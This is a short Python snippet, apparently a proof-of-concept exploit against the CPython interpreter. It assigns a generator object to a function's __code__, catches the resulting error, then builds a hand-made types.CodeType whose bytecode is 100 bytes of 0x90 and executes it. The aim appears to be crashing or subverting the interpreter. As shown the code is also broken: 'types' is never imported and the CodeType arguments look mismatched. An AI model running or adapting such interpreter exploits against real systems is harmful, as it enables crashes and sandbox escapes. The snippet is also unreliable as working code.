fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi

# Guard the exploit
try:
    fn()
except TypeError as e:
    if '__init__' not in str(e):
        raise e

# Construct our own code object and execute it
co = types.CodeType(
    0,
    0,
    0,
    0,
    0,
    b'\x90' * 100,
    (),
    (),
    (),
    '',
    '',
    0,
    b'')

fn.__code__ = co
fn()
